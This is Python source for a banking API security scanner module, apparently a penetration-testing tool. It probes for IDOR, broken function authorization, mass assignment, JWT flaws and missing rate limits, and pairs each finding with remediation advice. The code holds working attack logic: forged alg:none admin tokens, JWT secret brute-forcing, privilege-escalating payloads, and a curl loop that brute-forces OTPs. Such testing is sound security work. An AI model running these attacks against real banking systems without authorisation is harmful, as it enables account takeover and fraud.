"""
GATOR PRO Enterprise — Module 4: API Security Engine
═══════════════════════════════════════════════════════
Banking API security testing:
  • BOLA / IDOR — horizontal privilege escalation
      /accounts/{id}, /transactions/{id}, /cards/{id}
      Auto-increments IDs 1..1000, UUID fuzzing
  • BFLA — broken function level authorization
      Low-priv token → admin endpoints
      HTTP verb tampering (GET→PUT/DELETE/PATCH)
  • Mass Assignment — inject hidden fields
      role, isAdmin, balance, creditLimit
  • JWT Attacks:
      alg:none bypass
      RS256 → HS256 key confusion
      Expired token acceptance
      Weak secret brute-force (100-word list)
      JWT claim injection (sub/role/scope)
  • Rate Limiting — flood /login /otp/verify /transfer
  • API Enumeration — swagger/openapi auto-parse
  • Sensitive Data Exposure in responses
  • GraphQL introspection + IDOR
  • CORS + auth headers analysis
  • HTTP methods discovery (OPTIONS)
"""

import json
import re
import ssl
import time
import urllib.request
import urllib.parse
import urllib.error
import base64
import hmac
import hashlib
import socket
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Callable, Optional
import string
import itertools


# ─── Common API endpoint patterns (banking) ──────────────────
BANKING_API_PATHS = [
    # Core banking objects
    "/api/v1/accounts/{id}",
    "/api/v1/accounts/{id}/transactions",
    "/api/v1/accounts/{id}/balance",
    "/api/v1/accounts/{id}/statement",
    "/api/v1/transactions/{id}",
    "/api/v1/transactions/{id}/receipt",
    "/api/v1/cards/{id}",
    "/api/v1/cards/{id}/details",
    "/api/v1/cards/{id}/pin",
    "/api/v1/cards/{id}/limits",
    "/api/v1/users/{id}",
    "/api/v1/users/{id}/profile",
    "/api/v1/users/{id}/accounts",
    "/api/v1/users/{id}/password",
    "/api/v1/payments/{id}",
    "/api/v1/transfers/{id}",
    "/api/v1/loans/{id}",
    "/api/v1/loans/{id}/schedule",
    # Admin / privileged
    "/api/v1/admin/users",
    "/api/v1/admin/accounts",
    "/api/v1/admin/transactions",
    "/api/v1/admin/settings",
    "/api/admin/users",
    "/api/admin/config",
    "/admin/api/users",
    # Reports / exports
    "/api/v1/reports",
    "/api/v1/export",
    "/api/v1/audit-log",
    # Generics
    "/api/v2/accounts/{id}",
    "/api/accounts/{id}",
    "/rest/accounts/{id}",
    "/v1/accounts/{id}",
    "/v2/accounts/{id}",
]

# ─── Mass assignment injection fields ────────────────────────
MASS_ASSIGN_FIELDS = [
    {"role": "admin"},
    {"role": "ADMIN"},
    {"isAdmin": True},
    {"is_admin": True},
    {"admin": True},
    {"privilege": "admin"},
    {"userType": "ADMIN"},
    {"type": "admin"},
    {"balance": 9999999.99},
    {"creditLimit": 9999999},
    {"credit_limit": 9999999},
    {"accountType": "premium"},
    {"status": "active"},
    {"verified": True},
    {"emailVerified": True},
    {"phone_verified": True},
    {"twoFactorEnabled": False},
    {"two_factor_enabled": False},
    {"mfa_enabled": False},
]

# ─── JWT weak secret list ────────────────────────────────────
JWT_WEAK_SECRETS = [
    "secret", "password", "123456", "qwerty", "admin",
    "token", "jwt", "key", "private", "mysecret",
    "changeme", "default", "test", "dev", "prod",
    "secret123", "password123", "jwt_secret", "app_secret",
    "mysecretkey", "supersecret", "verysecret", "topsecret",
    "banking", "bank", "finance", "secure", "security",
    "api_key", "api_secret", "access_token", "auth_token",
    "", "null", "undefined", "none",
    # Common Java defaults
    "HS256", "RS256", "mySecretKey",
    "SpringBootSecretKey", "spring.security.secret",
    # .NET defaults
    "IssuerSigningKey", "SecurityKey",
    # 1C/Russian specific
    "1C", "1c-enterprise", "1ceabc",
]

# ─── Rate limit test endpoints ────────────────────────────────
RATE_LIMIT_ENDPOINTS = [
    "/api/v1/auth/login",
    "/api/v1/auth/signin",
    "/api/v1/auth/otp/verify",
    "/api/v1/auth/otp",
    "/api/v1/auth/2fa/verify",
    "/login", "/signin",
    "/api/v1/transfers",
    "/api/v1/payments",
    "/api/v1/password/reset",
    "/api/v1/password/forgot",
]

# ─── Swagger / API docs paths ─────────────────────────────────
API_DOC_PATHS = [
    "/swagger.json", "/swagger.yaml", "/swagger-ui.html",
    "/api-docs", "/api-docs.json", "/api/docs",
    "/openapi.json", "/openapi.yaml",
    "/v1/api-docs", "/v2/api-docs", "/v3/api-docs",
    "/swagger/v1/swagger.json", "/swagger/v2/swagger.json",
    "/.well-known/openid-configuration",
    "/.well-known/oauth-authorization-server",
    "/graphql", "/graphiql", "/__graphql", "/playground",
    "/api/graphql",
]

# ─── Sensitive data patterns in API responses ─────────────────
SENSITIVE_PATTERNS = {
    "Credit Card PAN":  r"\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13})\b",
    "CVV/CVC":          r'"(?:cvv|cvc|cvv2|cvc2|securityCode)"\s*:\s*"(\d{3,4})"',
    "Card Expiry":      r'"(?:expiry|expirationDate|expDate)"\s*:\s*"(\d{2}/\d{2,4})"',
    "Account Number":   r'"(?:accountNumber|account_number|iban)"\s*:\s*"([A-Z]{2}\d{20}|\d{12,20})"',
    "Password Hash":    r'"(?:password|passwordHash|hashedPassword)"\s*:\s*"(\$2[aby]?\$\d+\$.{53}|[a-f0-9]{32,64})"',
    "Private Key":      r"-----BEGIN (?:RSA |EC )?PRIVATE KEY-----",
    "AWS Key":          r"\b(AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}\b",
    "JWT in response":  r'"(?:token|accessToken|access_token|authToken)"\s*:\s*"(eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)"',
    "PIN code":         r'"(?:pin|pinCode|cardPin)"\s*:\s*"(\d{4,6})"',
    "OTP secret":       r'"(?:otpSecret|totpSecret|mfaSecret)"\s*:\s*"[A-Z2-7]{16,}"',
}

# ─── GraphQL introspection query ─────────────────────────────
GRAPHQL_INTROSPECTION = """{
  "__schema": {
    "types": [
      { "name": "__typename", "kind": "SCALAR" }
    ]
  }
}"""

GRAPHQL_FULL_INTROSPECTION = """
{
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      kind
      fields {
        name
        type { name kind }
        args { name type { name kind } }
      }
    }
  }
}
"""


class APISecEngine:
    """
    Banking API Security Testing Engine.
    Tests for OWASP API Top 10 vulnerabilities.
    """

    def __init__(self, target: str, scan_id: str, db, push_event: Callable,
                 endpoints: list = None, auth_header: str = None, **kwargs):
        self.target      = self._clean(target)
        self.base_url    = self._build_base(target)
        self.scan_id     = scan_id
        self.db          = db
        self.push_event  = push_event
        self.endpoints   = endpoints or []
        self.auth_header = auth_header  # e.g. "Bearer eyJ..."
        self.findings    = []
        self.api_base    = self._detect_api_base()

    def _clean(self, t: str) -> str:
        return t.replace("https://","").replace("http://","").split("/")[0].split(":")[0].strip()

    def _build_base(self, t: str) -> str:
        t = t.strip()
        if t.startswith("http"):
            return t.rstrip("/")
        return f"https://{t}"

    def _detect_api_base(self) -> str:
        """Detect whether API is at /api/v1, /api, /v1, etc."""
        candidates = ["/api/v1", "/api/v2", "/api", "/v1", "/v2", ""]
        for candidate in candidates:
            url = self.base_url + candidate + "/accounts/1"
            resp = self._req("GET", url)
            if resp and resp["status"] in [200, 401, 403, 404]:
                return self.base_url + candidate
        return self.base_url

    def log(self, level: str, msg: str, data: dict = None):
        self.push_event(self.db, self.scan_id, "log", level, msg, data or {})

    def finding(self, f: dict):
        self.findings.append(f)
        sev = f.get("severity", "info")
        self.push_event(self.db, self.scan_id, "finding", sev,
            f"[{sev.upper()}] {f.get('title','')[:80]}",
            {"severity": sev, "cvss": f.get("cvss", 0)})

    # ═══════════════════════════════════════════════════════════
    def run(self) -> dict:
        self.log("info", f"╔══ API SECURITY ══ {self.base_url} ══╗")
        t0 = time.time()

        self._discover_api_docs()
        self._test_bola_idor()
        self._test_bfla()
        self._test_mass_assignment()
        self._test_jwt_attacks()
        self._test_rate_limiting()
        self._test_sensitive_exposure()
        self._test_http_methods()
        self._test_graphql()
        self._test_api_versioning()

        elapsed = round(time.time() - t0, 1)
        c = len([f for f in self.findings if f["severity"] == "critical"])
        h = len([f for f in self.findings if f["severity"] == "high"])
        self.log("ok",
            f"╚══ API SCAN DONE {elapsed}s ══ "
            f"Findings: {len(self.findings)} (C:{c} H:{h}) ══╝")
        return {"findings": self.findings}

    # ─── API Docs Discovery ───────────────────────────────────
    def _discover_api_docs(self):
        self.log("data","[API] Discovering API documentation...")
        for path in API_DOC_PATHS:
            url = self.base_url + path
            resp = self._req("GET", url)
            if not resp or resp["status"] not in [200]:
                continue

            body = resp["body"]
            self.log("warn", f"[API] 📄 API docs exposed: {url}")

            # Parse OpenAPI / Swagger
            if "swagger" in path or "api-docs" in path or "openapi" in path:
                endpoints = self._parse_openapi(body, url)
                if endpoints:
                    self.endpoints.extend(endpoints)
                    self.log("ok",
                        f"[API] Parsed {len(endpoints)} endpoints from {path}")
                self.finding({
                    "severity":       "medium",
                    "cvss":           5.3,
                    "owasp_category": "API9:2023-Improper Inventory Management",
                    "title":          f"API documentation publicly accessible: {path}",
                    "description":    "API specification exposed without authentication. Gives attackers full endpoint inventory.",
                    "recommendation": "Protect API docs with authentication or restrict to internal IPs.",
                    "evidence":       f"GET {url} → HTTP 200",
                    "host":           self.target,
                    "url":            url,
                    "tool":           "gator_api",
                    "category":       "api",
                })

            # GraphQL introspection
            if "graphql" in path or "graphiql" in path:
                self._test_graphql_endpoint(url)

    def _parse_openapi(self, body: str, doc_url: str) -> list:
        """Extract endpoint list from OpenAPI/Swagger spec."""
        endpoints = []
        try:
            data = json.loads(body)
        except json.JSONDecodeError:
            return []

        base = (data.get("basePath", "") or
                data.get("servers", [{}])[0].get("url","") if data.get("servers") else "")

        paths = data.get("paths", {})
        for path, methods in paths.items():
            for method, details in methods.items():
                if method.upper() in ["GET","POST","PUT","DELETE","PATCH"]:
                    full_url = self.base_url + base + path
                    endpoints.append({
                        "url":    full_url,
                        "method": method.upper(),
                        "path":   path,
                        "params": {p["name"]: "" for p in details.get("parameters",[]) if p.get("in")=="query"},
                    })
        return endpoints[:100]  # cap at 100

    # ─── BOLA / IDOR ─────────────────────────────────────────
    def _test_bola_idor(self):
        self.log("data","[BOLA] Testing for Broken Object Level Authorization (IDOR)...")
        found = 0

        # Use discovered endpoints + banking patterns
        test_paths = list(BANKING_API_PATHS)
        if self.endpoints:
            test_paths.extend([ep.get("path","") for ep in self.endpoints
                                if "{" in ep.get("path","") or "{id}" in ep.get("path","")])

        # Get baseline response for ID=1 with auth
        for path_template in test_paths[:20]:
            if "{id}" not in path_template:
                continue

            # Test sequential IDs
            responses_with_auth    = {}
            responses_without_auth = {}

            for test_id in [1, 2, 3, 9999, "abc", "'", "0"]:
                path = path_template.replace("{id}", str(test_id))
                url  = self.base_url + path

                # Request WITH auth (if we have a token)
                r_auth = self._req("GET", url, auth=self.auth_header)
                if r_auth:
                    responses_with_auth[test_id] = r_auth

                # Request WITHOUT auth
                r_no_auth = self._req("GET", url, auth=None)
                if r_no_auth:
                    responses_without_auth[test_id] = r_no_auth

            # BOLA: unauthenticated access to other users' data
            for test_id, resp in responses_without_auth.items():
                if resp["status"] == 200 and len(resp["body"]) > 50:
                    # Check it's actual data (not just {"status":"ok"})
                    if any(kw in resp["body"].lower() for kw in
                           ["account","balance","transaction","card","user","email","phone"]):
                        found += 1
                        self.log("warn",
                            f"[BOLA] 🚨 UNAUTHENTICATED ACCESS: {url}")
                        self.finding({
                            "severity":       "critical",
                            "cvss":           9.1,
                            "owasp_category": "API1:2023-Broken Object Level Authorization",
                            "pci_dss_req":    ["7.3.1","8.3.1"],
                            "cwe_ids":        ["CWE-639"],
                            "swift_control":  ["5.1","5.4"],
                            "title":          f"BOLA: Unauthenticated access to {path_template}",
                            "description":    (
                                f"Endpoint {path_template} returns sensitive banking data "
                                f"without any authentication. ID={test_id} returned HTTP 200 "
                                f"with {len(resp['body'])} bytes of data."),
                            "recommendation": (
                                "1. Enforce authentication on ALL API endpoints.\n"
                                "2. Validate that the authenticated user owns the requested resource.\n"
                                "3. Use UUIDs instead of sequential integer IDs.\n"
                                "4. Implement object-level authorization checks."),
                            "evidence":       (
                                f"GET {url} (no auth) → HTTP {resp['status']}\n"
                                f"Response snippet: {resp['body'][:200]}"),
                            "poc":            f"curl -s '{url}'",
                            "host":           self.target,
                            "url":            url,
                            "tool":           "gator_bola",
                            "category":       "api",
                        })
                        break

            # IDOR: accessing other users' objects with own valid token
            if self.auth_header and len(responses_with_auth) >= 2:
                status_codes = [r["status"] for r in responses_with_auth.values()]
                # If ALL IDs return 200, likely no per-object auth check
                if status_codes.count(200) >= 3:
                    path = path_template.replace("{id}", "2")
                    url  = self.base_url + path
                    self.log("warn",
                        f"[IDOR] ⚠️  Possible IDOR: all IDs accessible — {path_template}")
                    self.finding({
                        "severity":       "high",
                        "cvss":           8.1,
                        "owasp_category": "API1:2023-Broken Object Level Authorization",
                        "pci_dss_req":    ["7.3.1"],
                        "cwe_ids":        ["CWE-639"],
                        "title":          f"IDOR: All object IDs accessible — {path_template}",
                        "description":    (
                            f"Authenticated user can access any object ID in {path_template}. "
                            f"No per-object ownership check detected."),
                        "recommendation": (
                            "Check that authenticated user owns the resource before returning data. "
                            "Compare resource.owner_id == request.user_id on every request."),
                        "evidence":       f"IDs 1,2,3 all return HTTP 200",
                        "host":           self.target,
                        "url":            url,
                        "tool":           "gator_idor",
                        "category":       "api",
                    })
                    found += 1

        self.log("ok", f"[BOLA] Done — {found} BOLA/IDOR found")

    # ─── BFLA ────────────────────────────────────────────────
    def _test_bfla(self):
        self.log("data","[BFLA] Testing Broken Function Level Authorization...")
        found = 0

        # Admin endpoints with low-priv token
        admin_paths = [
            "/api/v1/admin/users", "/api/v1/admin/accounts",
            "/api/v1/admin/transactions", "/api/v1/admin/settings",
            "/api/admin/users", "/admin/api/v1/users",
            "/api/v1/management/users", "/api/v1/internal/users",
        ]
        for path in admin_paths:
            url = self.base_url + path
            resp = self._req("GET", url, auth=self.auth_header)
            if resp and resp["status"] == 200 and len(resp["body"]) > 50:
                found += 1
                self.log("warn", f"[BFLA] 🚨 Admin endpoint accessible: {url}")
                self.finding({
                    "severity":       "critical",
                    "cvss":           9.8,
                    "owasp_category": "API5:2023-Broken Function Level Authorization",
                    "pci_dss_req":    ["7.3.1","7.3.2"],
                    "cwe_ids":        ["CWE-285"],
                    "title":          f"BFLA: Admin endpoint accessible — {path}",
                    "description":    (
                        f"Administrative endpoint {path} is accessible with "
                        f"{'provided credentials' if self.auth_header else 'no authentication'}. "
                        f"Attacker can manage all users/accounts."),
                    "recommendation": (
                        "Implement role-based access control (RBAC). "
                        "Verify user has ADMIN role before any admin function. "
                        "Log all access attempts to admin endpoints."),
                    "evidence":       f"GET {url} → HTTP 200, {len(resp['body'])} bytes",
                    "poc":            f"curl -s '{url}'" + (f" -H 'Authorization: {self.auth_header}'" if self.auth_header else ""),
                    "host":           self.target,
                    "url":            url,
                    "tool":           "gator_bfla",
                    "category":       "api",
                })

        # HTTP verb tampering — try DELETE/PUT on read-only endpoints
        if self.endpoints:
            for ep in self.endpoints[:10]:
                url = ep.get("url","")
                if not url: continue
                for method in ["DELETE","PUT","PATCH"]:
                    resp = self._req(method, url, auth=self.auth_header,
                                     body=json.dumps({"test": "gator"}))
                    if resp and resp["status"] not in [404, 405, 403, 401, 302]:
                        found += 1
                        self.log("warn",
                            f"[BFLA] ⚠️  {method} allowed on {url} → HTTP {resp['status']}")
                        self.finding({
                            "severity":       "high",
                            "cvss":           7.5,
                            "owasp_category": "API5:2023-Broken Function Level Authorization",
                            "title":          f"BFLA: {method} allowed on {url}",
                            "description":    f"HTTP {method} method accepted — may allow unauthorized modification.",
                            "recommendation": "Explicitly restrict HTTP methods per endpoint. Return 405 for disallowed methods.",
                            "evidence":       f"{method} {url} → HTTP {resp['status']}",
                            "host":           self.target,
                            "url":            url,
                            "tool":           "gator_bfla",
                            "category":       "api",
                        })

        self.log("ok", f"[BFLA] Done — {found} BFLA found")

    # ─── Mass Assignment ─────────────────────────────────────
    def _test_mass_assignment(self):
        self.log("data","[MASS] Testing for Mass Assignment vulnerabilities...")
        found = 0

        # Look for registration/profile update endpoints
        test_endpoints = [
            ("/api/v1/auth/register", "POST"),
            ("/api/v1/users/me", "PUT"),
            ("/api/v1/users/me", "PATCH"),
            ("/api/v1/profile", "PUT"),
            ("/api/v1/profile", "PATCH"),
            ("/api/v1/account/update", "POST"),
        ]
        if self.endpoints:
            for ep in self.endpoints:
                if ep.get("method") in ["POST","PUT","PATCH"]:
                    test_endpoints.append((ep.get("url",""), ep.get("method","POST")))

        for path, method in test_endpoints[:15]:
            url = path if path.startswith("http") else self.base_url + path

            for extra_fields in MASS_ASSIGN_FIELDS[:10]:
                payload = {"name": "Test User", "email": "test@test.com"}
                payload.update(extra_fields)

                resp = self._req(method, url, auth=self.auth_header,
                                 body=json.dumps(payload),
                                 ct="application/json")
                if not resp or resp["status"] not in [200, 201, 202]:
                    continue

                # Check if injected field appears in response
                field_name = list(extra_fields.keys())[0]
                field_val  = list(extra_fields.values())[0]
                if (str(field_val).lower() in resp["body"].lower() or
                        field_name.lower() in resp["body"].lower()):
                    found += 1
                    self.log("warn",
                        f"[MASS] 🚨 Mass Assignment: {url} accepts '{field_name}'")
                    self.finding({
                        "severity":       "high",
                        "cvss":           8.8,
                        "owasp_category": "API6:2023-Unrestricted Access to Sensitive Business Flows",
                        "pci_dss_req":    ["6.2.4"],
                        "cwe_ids":        ["CWE-915"],
                        "title":          f"Mass Assignment: field '{field_name}' accepted — {path}",
                        "description":    (
                            f"The API endpoint {path} accepts the '{field_name}' field "
                            f"which should be server-controlled. An attacker can set "
                            f"privileged fields (admin role, balance) during account operations."),
                        "recommendation": (
                            "1. Use allowlist of permitted fields (not blocklist).\n"
                            "2. Use DTOs / serialization schemas that explicitly map allowed fields.\n"
                            "3. Never bind request body directly to database models.\n"
                            "4. Strip all non-whitelisted fields before processing."),
                        "evidence":       (
                            f"{method} {url}\n"
                            f"Payload: {json.dumps(payload)}\n"
                            f"Response contains: {field_name}"),
                        "host":           self.target,
                        "url":            url,
                        "tool":           "gator_mass",
                        "category":       "api",
                    })
                    break  # one finding per endpoint

        self.log("ok", f"[MASS] Done — {found} mass assignment found")

    # ─── JWT Attacks ──────────────────────────────────────────
    def _test_jwt_attacks(self):
        self.log("data","[JWT] Testing JWT vulnerabilities...")
        found = 0

        # Extract JWT from auth header or discover via login probe
        jwt_token = self._extract_jwt(self.auth_header)
        if not jwt_token:
            jwt_token = self._probe_for_jwt()

        if not jwt_token:
            self.log("info","[JWT] No JWT token found — skipping JWT attacks")
            return

        self.log("info", f"[JWT] Token found: {jwt_token[:40]}...")
        header, payload, signature = self._split_jwt(jwt_token)
        if not header:
            return

        try:
            h = json.loads(base64.b64decode(self._pad(header)))
            p = json.loads(base64.b64decode(self._pad(payload)))
        except Exception:
            self.log("warn","[JWT] Cannot decode token")
            return

        self.log("info", f"[JWT] Header: {h}")
        self.log("info", f"[JWT] Payload claims: {list(p.keys())}")

        # 1. alg:none attack
        self._jwt_none_attack(header, payload, p)

        # 2. RS256 → HS256 confusion
        self._jwt_algo_confusion(header, payload, signature, h, p)

        # 3. Expired token acceptance
        self._jwt_expired_check(jwt_token, p)

        # 4. Weak secret brute-force
        self._jwt_brute_secret(jwt_token, header, payload, h)

        # 5. Claim injection
        self._jwt_claim_injection(header, payload, p)

        self.log("ok", f"[JWT] Done — {found} JWT vulnerabilities")

    def _jwt_none_attack(self, header_b64: str, payload_b64: str, payload: dict):
        """Try alg:none to bypass signature verification."""
        self.log("info","[JWT] Testing alg:none bypass...")
        for none_val in ["none","None","NONE","nOnE"]:
            fake_header = base64.urlsafe_b64encode(
                json.dumps({"alg": none_val, "typ": "JWT"}).encode()
            ).rstrip(b"=").decode()
            # Escalate privileges in payload
            evil_payload = dict(payload)
            for role_key in ["role","roles","scope","authorities","permissions","userType"]:
                if role_key in evil_payload:
                    evil_payload[role_key] = "admin"
                    break
            else:
                evil_payload["role"] = "admin"

            evil_payload_b64 = base64.urlsafe_b64encode(
                json.dumps(evil_payload).encode()
            ).rstrip(b"=").decode()

            none_token = f"{fake_header}.{evil_payload_b64}."

            # Test on any discovered API endpoint
            for path in ["/api/v1/users/me", "/api/v1/admin/users", "/api/v1/profile"]:
                url  = self.base_url + path
                resp = self._req("GET", url, auth=f"Bearer {none_token}")
                if resp and resp["status"] == 200 and len(resp["body"]) > 20:
                    self.log("warn","[JWT] 🚨 alg:none bypass WORKS!")
                    self.finding({
                        "severity":       "critical",
                        "cvss":           9.8,
                        "owasp_category": "API2:2023-Broken Authentication",
                        "pci_dss_req":    ["8.3.1","8.4.2"],
                        "cwe_ids":        ["CWE-347"],
                        "title":          "JWT alg:none bypass — signature verification disabled",
                        "description":    (
                            "The JWT library accepts tokens with alg:none, meaning "
                            "the signature is never verified. Attacker can forge any token "
                            "and impersonate any user including admins."),
                        "recommendation": (
                            "1. Explicitly specify allowed algorithms in JWT library config.\n"
                            "2. Reject tokens with alg:none.\n"
                            "3. Use a well-maintained JWT library.\n"
                            "4. Pin to RS256 or ES256 (asymmetric algorithms)."),
                        "evidence":       f"Token with alg:none accepted at {url}",
                        "poc":            f"# JWT with alg:none:\n{none_token}",
                        "host":           self.target,
                        "url":            url,
                        "tool":           "gator_jwt",
                        "category":       "api",
                    })
                    return

    def _jwt_algo_confusion(self, header_b64: str, payload_b64: str,
                             sig: str, header: dict, payload: dict):
        """RS256 → HS256 algorithm confusion attack."""
        if header.get("alg","").upper() != "RS256":
            return
        self.log("info","[JWT] Testing RS256→HS256 algorithm confusion...")
        # Attempt to get public key (often at /api/v1/auth/keys or /.well-known/jwks.json)
        for jwks_url in [
            self.base_url + "/.well-known/jwks.json",
            self.base_url + "/api/v1/auth/jwks",
            self.base_url + "/oauth2/jwks",
        ]:
            resp = self._req("GET", jwks_url)
            if resp and resp["status"] == 200 and "keys" in resp["body"]:
                self.log("warn",
                    f"[JWT] ⚠️  JWKS endpoint exposed: {jwks_url}")
                self.finding({
                    "severity":       "medium",
                    "cvss":           5.3,
                    "owasp_category": "API2:2023-Broken Authentication",
                    "title":          f"JWKS endpoint publicly accessible: {jwks_url}",
                    "description":    "Public JWT signing keys exposed. May enable algorithm confusion attacks.",
                    "recommendation": "Restrict JWKS endpoint or add rate limiting.",
                    "evidence":       f"GET {jwks_url} → HTTP 200",
                    "host":           self.target,
                    "url":            jwks_url,
                    "tool":           "gator_jwt",
                    "category":       "api",
                })

    def _jwt_expired_check(self, token: str, payload: dict):
        """Test if expired tokens are accepted."""
        import time as time_mod
        exp = payload.get("exp", 0)
        if not exp or exp > time_mod.time():
            return  # Token not expired or no exp claim
        self.log("info","[JWT] Testing expired token acceptance...")
        for path in ["/api/v1/users/me", "/api/v1/profile", "/api/v1/accounts"]:
            url  = self.base_url + path
            resp = self._req("GET", url, auth=f"Bearer {token}")
            if resp and resp["status"] == 200:
                self.log("warn","[JWT] ⚠️  Expired token accepted!")
                self.finding({
                    "severity":       "high",
                    "cvss":           8.1,
                    "owasp_category": "API2:2023-Broken Authentication",
                    "pci_dss_req":    ["8.3.9"],
                    "cwe_ids":        ["CWE-613"],
                    "title":          "JWT: Expired tokens accepted",
                    "description":    "Server accepts JWT tokens past their expiration date (exp claim ignored).",
                    "recommendation": "Validate exp claim on every request. Reject tokens with exp in the past.",
                    "evidence":       f"Expired token (exp={exp}) accepted at {url}",
                    "host":           self.target,
                    "url":            url,
                    "tool":           "gator_jwt",
                    "category":       "api",
                })
                break

    def _jwt_brute_secret(self, token: str, header_b64: str,
                           payload_b64: str, header: dict):
        """Brute-force HMAC secret for HS256/HS512 tokens."""
        alg = header.get("alg","").upper()
        if alg not in ("HS256","HS384","HS512"):
            return
        self.log("info",f"[JWT] Brute-forcing {alg} secret ({len(JWT_WEAK_SECRETS)} candidates)...")

        msg = f"{header_b64}.{payload_b64}".encode()

        hash_fn_map = {
            "HS256": hashlib.sha256,
            "HS384": hashlib.sha384,
            "HS512": hashlib.sha512,
        }
        hash_fn = hash_fn_map.get(alg, hashlib.sha256)

        # Decode original signature
        try:
            orig_sig = base64.urlsafe_b64decode(self._pad(token.split(".")[2]))
        except Exception:
            return

        for secret in JWT_WEAK_SECRETS:
            sig = hmac.new(secret.encode(), msg, hash_fn).digest()
            if sig == orig_sig:
                self.log("warn", f"[JWT] 🚨 WEAK SECRET FOUND: '{secret}'")
                self.finding({
                    "severity":       "critical",
                    "cvss":           9.8,
                    "owasp_category": "API2:2023-Broken Authentication",
                    "pci_dss_req":    ["8.3.6","8.6.1"],
                    "cwe_ids":        ["CWE-798","CWE-326"],
                    "title":          f"JWT weak secret: '{secret}'",
                    "description":    (
                        f"The {alg} JWT signing secret is '{secret}'. "
                        "Attacker can forge arbitrary tokens for any user/role."),
                    "recommendation": (
                        "Use a cryptographically random secret of at least 256 bits. "
                        "Better: switch to RS256/ES256 (asymmetric). "
                        "Rotate the secret immediately."),
                    "evidence":       f"HMAC-{alg} with secret='{secret}' matches token signature",
                    "poc":            (
                        f"# Forge admin token with secret '{secret}':\n"
                        f"import jwt\n"
                        f"token = jwt.encode({{'sub':'admin','role':'admin'}}, "
                        f"'{secret}', algorithm='{alg}')"),
                    "host":           self.target,
                    "url":            self.base_url,
                    "tool":           "gator_jwt",
                    "category":       "api",
                })
                return

    def _jwt_claim_injection(self, header_b64: str, payload_b64: str, payload: dict):
        """Test if we can inject claims to escalate privileges."""
        self.log("info","[JWT] Testing JWT claim injection...")
        # We can't forge without the key, but check if role/admin is present
        # and test if server validates it
        if any(k in payload for k in ["role","admin","isAdmin","scope","authorities"]):
            self.log("info","[JWT] Role claims present in payload — test manually for privilege escalation")

    # ─── Rate Limiting ────────────────────────────────────────
    def _test_rate_limiting(self):
        self.log("data","[RATE] Testing rate limiting on auth endpoints...")
        found = 0

        for path in RATE_LIMIT_ENDPOINTS:
            url = self.base_url + path
            # Check if endpoint exists first
            probe = self._req("POST", url,
                body=json.dumps({"username":"ratetest","password":"wrong1"}),
                ct="application/json")
            if not probe or probe["status"] not in [200,400,401,403,422]:
                continue

            # Send 20 rapid requests
            t0 = time.time()
            statuses = []
            with ThreadPoolExecutor(max_workers=10) as ex:
                futs = [
                    ex.submit(self._req, "POST", url,
                        json.dumps({"username":"ratetest","password":f"wrong{i}"}),
                        None, "application/json")
                    for i in range(20)
                ]
                for f in as_completed(futs):
                    r = f.result()
                    if r:
                        statuses.append(r["status"])

            elapsed = time.time() - t0
            # If NO 429/403 responses → no rate limiting
            rate_limited = any(s in [429, 423, 503] for s in statuses)

            if not rate_limited and len(statuses) >= 15:
                found += 1
                rps = round(len(statuses) / elapsed, 1)
                self.log("warn",
                    f"[RATE] 🚨 No rate limiting: {url} "
                    f"({len(statuses)} req in {elapsed:.1f}s, ~{rps} req/s)")
                self.finding({
                    "severity":       "high",
                    "cvss":           7.5,
                    "owasp_category": "API4:2023-Unrestricted Resource Consumption",
                    "pci_dss_req":    ["8.3.4","8.3.10"],
                    "cwe_ids":        ["CWE-307"],
                    "swift_control":  ["6.1"],
                    "title":          f"No rate limiting — {path}",
                    "description":    (
                        f"Endpoint {path} has no rate limiting. "
                        f"Sent {len(statuses)} requests in {elapsed:.1f}s ({rps} req/s) "
                        f"without any 429 response. Enables brute-force attacks on "
                        f"passwords, OTP codes, and account lockout bypass."),
                    "recommendation": (
                        "1. Implement rate limiting: max 5 failed attempts per minute per IP.\n"
                        "2. Add CAPTCHA after 3 failed attempts.\n"
                        "3. Implement account lockout after 10 failures.\n"
                        "4. Use token bucket or leaky bucket algorithm.\n"
                        "5. Return 429 Too Many Requests with Retry-After header."),
                    "evidence":       (
                        f"{len(statuses)} requests sent in {elapsed:.1f}s\n"
                        f"Status codes: {set(statuses)}\n"
                        f"No HTTP 429 received"),
                    "poc":            (
                        f"# Brute-force OTP (no rate limit):\n"
                        f"for i in $(seq 1000 9999); do\n"
                        f"  curl -s -X POST '{url}' -d '{{\"otp\":\"'$i'\"}}' &\n"
                        f"done"),
                    "host":           self.target,
                    "url":            url,
                    "tool":           "gator_ratelimit",
                    "category":       "api",
                })

        self.log("ok", f"[RATE] Done — {found} rate limit issues")

    # ─── Sensitive Data Exposure ─────────────────────────────
    def _test_sensitive_exposure(self):
        self.log("data","[SENSITIVE] Checking API responses for sensitive data...")
        test_urls = [
            self.base_url + "/api/v1/users/me",
            self.base_url + "/api/v1/profile",
            self.base_url + "/api/v1/accounts",
            self.base_url + "/api/v1/cards",
        ]
        if self.endpoints:
            test_urls.extend([ep.get("url","") for ep in self.endpoints[:20]])

        for url in test_urls:
            if not url: continue
            resp = self._req("GET", url, auth=self.auth_header)
            if not resp or resp["status"] not in [200]:
                continue

            body = resp["body"]
            for field_name, pattern in SENSITIVE_PATTERNS.items():
                m = re.search(pattern, body, re.IGNORECASE)
                if m:
                    matched = m.group()[:60]
                    self.log("warn",
                        f"[SENSITIVE] 🚨 {field_name} in response: {url}")
                    self.finding({
                        "severity":       "critical" if "Card" in field_name or "PIN" in field_name else "high",
                        "cvss":           9.8 if "Card" in field_name else 7.5,
                        "owasp_category": "API3:2023-Broken Object Property Level Authorization",
                        "pci_dss_req":    ["3.3.1","3.4.1","3.5.1"],
                        "cwe_ids":        ["CWE-200","CWE-312"],
                        "title":          f"Sensitive data in API response: {field_name}",
                        "description":    f"API endpoint returns {field_name} in plain text response.",
                        "recommendation": (
                            "1. Never return sensitive data in API responses.\n"
                            "2. Mask card numbers: show only last 4 digits.\n"
                            "3. Never return passwords, CVV, PIN, or full card data.\n"
                            "4. Implement response filtering / field-level encryption."),
                        "evidence":       f"Found in {url}: {matched}",
                        "host":           self.target,
                        "url":            url,
                        "tool":           "gator_sensitive",
                        "category":       "api",
                    })

    # ─── HTTP Methods ─────────────────────────────────────────
